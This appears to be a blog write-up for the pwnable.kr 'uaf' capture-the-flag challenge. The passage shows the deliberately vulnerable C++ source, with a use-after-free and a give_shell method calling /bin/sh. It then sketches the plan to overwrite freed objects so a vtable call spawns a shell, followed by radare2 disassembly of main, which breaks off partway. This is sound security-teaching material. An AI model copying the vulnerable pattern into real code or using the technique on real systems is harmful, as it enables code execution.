|   _/|  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |___ |    _]    |    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|    / 
|  |  |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type &quot;irssi&quot; command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Wed Jul  4 10:19:57 2018 from 213.89.161.62
uaf@ubuntu:~$ ls -la
total 44
drwxr-x---  5 root uaf      4096 Oct 23  2016 .
drwxr-xr-x 87 root root     4096 Dec 27  2017 ..
d---------  2 root root     4096 Sep 20  2015 .bash_history
-rw-r-----  1 root uaf_pwn    22 Sep 25  2015 flag
dr-xr-xr-x  2 root root     4096 Sep 20  2015 .irssi
drwxr-xr-x  2 root root     4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x  1 root uaf_pwn 15463 Sep 25  2015 uaf
-rw-r--r--  1 root root     1431 Sep 25  2015 uaf.cpp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once again we are presented with two files - binary and the source code. Let’s take a look at it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;give_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;My name is &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; years old&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am a nice guy!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am a cute girl!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Jack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Jill&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1. use&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2. after&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3. free&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;your data is allocated&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;What we can see here is two objects of classes &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Woman&lt;/code&gt;. Both those classes inherit the methods and values from class &lt;code class=&quot;highlighter-rouge&quot;&gt;Human&lt;/code&gt;. This class is particularly interesting, as it contains the virtual methond &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell&lt;/code&gt; that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In addition, we can see a simple use-after-free vulnerability. After pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; in main &lt;code class=&quot;highlighter-rouge&quot;&gt;while(1)&lt;/code&gt; loop of the program, we can free the objects previously allocated, but we still can call methods &lt;code class=&quot;highlighter-rouge&quot;&gt;m-&amp;gt;introduce();&lt;/code&gt; by pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In addition, by pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; we can allocate some bytes of data using &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that is supposed to specify how much data to read, and &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[2]&lt;/code&gt; that is the filename that we want to read.&lt;/p&gt;

&lt;p&gt;With this information we can think of a simple attack, firstly free the objects, overwrite their data with something that we especially craft in order to make a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell&lt;/code&gt; method and call it with first option.&lt;/p&gt;

&lt;p&gt;But firstly, let’s diassemble this binary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;uaf@ubuntu:~$ r2 ./uaf
 -- Hello Mr. Anderson
[0x00400de0]&amp;gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x00400de0]&amp;gt; s main 
[0x00400ec4]&amp;gt; pdf
            ;-- main:
/ (fcn) sym.main 490
|   sym.main ();
|           ; var int local_60h @ rbp-0x60
|           ; var int local_54h @ rbp-0x54
|           ; var int local_50h @ rbp-0x50
|           ; var int local_40h @ rbp-0x40
|           ; var int local_38h @ rbp-0x38
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; var int local_12h @ rbp-0x12
|           ; var int local_11h @ rbp-0x11
|              ; DATA XREF from 0x00400dfd (entry0)
|           0x00400ec4      55             push rbp
|           0x00400ec5      4889e5         mov rbp, rsp
|           0x00400ec8      4154           push r12
|           0x00400eca      53             push rbx
|           0x00400ecb      4883ec50       sub rsp, 0x50               ; 'P'
|           0x00400ecf      897dac         mov dword [rbp - local_54h], edi
|           0x00400ed2      488975a0       mov qword [rbp - local_60h], rsi
|           0x00400ed6      488d45ee       lea rax, [rbp - local_12h]
|           0x00400eda      4889c7         mov rdi, rax
|           0x00400edd      e88efeffff     call sym.std::allocator_char_::allocator
|           0x00400ee2      488d55ee       lea rdx, [rbp - local_12h]
|           0x00400ee6      488d45b0       lea rax, [rbp - local_50h]
|           0x00400eea      bef0144000     mov esi, str.Jack           ; &quot;Jack&quot; @ 0x4014f0
|           0x00400eef      4889c7         mov rdi, rax
|           0x00400ef2      e819feffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string
|           0x00400ef7      4c8d65b0       lea r12, [rbp - local_50h]
|           0x00400efb      bf18000000     mov edi, 0x18
|           0x00400f00      e88bfeffff     call sym.operatornew
|           0x00400f05      4889c3         mov rbx, rax
|           0x00400f08      ba19000000     mov edx, 0x19
|           0x00400f0d      4c89e6         mov rsi, r12
|           0x00400f10      4889df         mov rdi, rbx
|           0x00400f13      e84c030000     call sym.Man::Man
|           0x00400f18      48895dc8       mov qword [rbp - local_38h], rbx
|           0x00400f1c      488d45b0       lea rax, [rbp - local_50h]
|           0x00400f20      4889c7         mov rdi, rax
|           0x00400f23      e8d8fdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::_basic_string
|           0x00400f28      488d45ee       lea rax, [rbp - local_12h]
|           0x00400f2c      4889c7         mov rdi, rax
|           0x00400f2f      e80cfeffff     call sym.std::allocator_char_::_allocator
|           0x00400f34      488d45ef       lea rax, [rbp - local_11h]
|           0x00400f38      4889c7         mov rdi, rax
|           0x00400f3b      e830feffff     call sym.std::allocator_char_::allocator
|           0x00400f40      488d55ef       lea rdx, [rbp - local_11h]
|           0x00400f44      488d45c0       lea rax, [rbp - local_40h]
|           0x00400f48      bef5144000     mov esi, str.Jill           ; &quot;Jill&quot; @ 0x4014f5
|           0x00400f4d      4889c7         mov rdi, rax
|           0x00400f50      e8bbfdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string
|           0x00400f55      4c8d65c0       lea r12, [rbp - local_40h]
|           0x00400f59      bf18000000     mov edi, 0x18
|           0x00400f5e      e82dfeffff     call sym.operatornew
|           0x00400f63      4889c3         mov rbx, rax
|           0x00400f66      ba15000000     mov edx, 0x15
|           0x00400f6b      4c89e6         mov rsi, r12
|           0x00400f6e      4889df         mov rdi, rbx
|           0x00400f71      e892030000     call sym.Woman::Woman
|           0x00400f76      48895dd0       mov qword [rbp - local_30h], rbx
|           0x00400f7a      488d45c0       lea rax, [rbp - local_40h]
|           0x00400f7e      4889c7         mov rdi, rax
|           0x00400f81      e87afdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::_basic_string
|           0x00400f86      488d45ef       lea rax, [rbp - local_11h]
|           0x00400f8a      4889c7         mov rdi, rax
|           0x00400f8d      e8aefdffff     call sym.std::allocator_char_::_allocator
|              ; JMP XREF from 0x004010a9 (sym.main)
|       .-&amp;gt; 0x00400f92      befa144000     mov esi, str.1._use_n2._after_n3._free_n ; &quot;1. use.2. after.3. free.&quot; @ 0x4014fa
|       !   0x00400f97      bf60226000     mov edi, obj.std::cout      ; obj.std::cout
|       !   0x00400f9c      e84ffdffff     call sym.std::operator___std::char_traits_char__
|       !   0x00400fa1      488d45e8       lea rax, [rbp - local_18h]
|       !   0x00400fa5      4889c6         mov rsi, rax
|       !   0x00400fa8      bfe0206000     mov edi, obj.std::cin       ; &quot;untu/Linaro 4.6.3-1ubuntu5) 4.6.3&quot; @ 0x6020e0
|       !   0x00400fad      e81efeffff     call sym.std::istream::operator__
|       !   0x00400fb2      8b45e8         mov eax, dword [rbp - local_18h]
|       !   0x00400fb5      83f802         cmp eax, 2
|      ,==&amp;lt; 0x00400fb8      7446           je 0x401000
|      |!   0x00400fba      83f803         cmp eax, 3
|     ,===&amp;lt; 0x00400fbd      0f84b3000000   je 0x401076
|     ||!   0x00400fc3      83f801         cmp eax, 1
|    ,====&amp;lt; 0x00400fc6      7405           je 0x400fcd
|   ,=====&amp;lt; 0x00400fc8      e9dc000000     jmp 0x4010a9
|   ||||!      ; JMP XREF from 0x00400fc6 (sym.main)
|   |`----&amp;gt; 0x00400fcd      488b45c8       mov rax, qword [rbp - local_38h]
|   | ||!   0x00400fd1      488b00         mov rax, qword [rax]
|   | ||!   0x00400fd4      4883c008       add rax, 8
|   | ||!   0x00400fd8      488b10         mov rdx, qword [rax]
|   | ||!   0x00400fdb      488b45c8       mov rax, qword [rbp - local_38h]
|   | ||!   0x00400fdf      4889c7         mov rdi, rax
|   | ||!   0x00400fe2      ffd2           call rdx
|   | ||!   0x00400fe4      488b45d0       mov rax, qword [rbp - local_30h]
|   | ||!   0x00400fe8      488b00         mov rax, qword [rax]
|   | ||!   0x00400feb      4883c008       add rax, 8
|   | ||!   0x00400fef      488b10         mov rdx, qword [rax]
|   | ||!   0x00400ff2      488b45d0       mov rax, qword [rbp - local_30h]
|   | ||!   0x00400ff6      4889c7         mov rdi, rax
|   | ||!   0x00400ff9      ffd2           call rdx
|   |,====&amp;lt; 0x00400ffb      e9a9000000     jmp 0x4010a9
|   ||||!      ; JMP XREF from 0x00400fb8 (sym.main)
|   |||`--&amp;gt; 0x00401000      488b45a0       mov rax, qword [rbp - local_60h]
|   ||| !   0x00401004      4883c008       add rax, 8
|   ||| !   0x00401008      488b00         mov rax, qword [rax]
|   ||| !   0x0040100b      4889c7         mov rdi, rax
|   ||| !   0x0040100e      e80dfdffff     call sym.imp.atoi          ; int atoi(const char *str)
|   ||| !   0x00401013      4898           cdqe
|   ||| !   0x00401015      488945d8       mov qword [rbp - local_28h], rax
|   ||| !   0x00401019      488b45d8       mov rax, qword [rbp - local_28h]
|   ||| !   0x0040101d      4889c7         mov rdi, rax
|   ||| !   0x00401020      e84bfcffff     call sym.operatornew__
|   ||| !   0x00401025      488945e0       mov qword [rbp - local_20h], rax
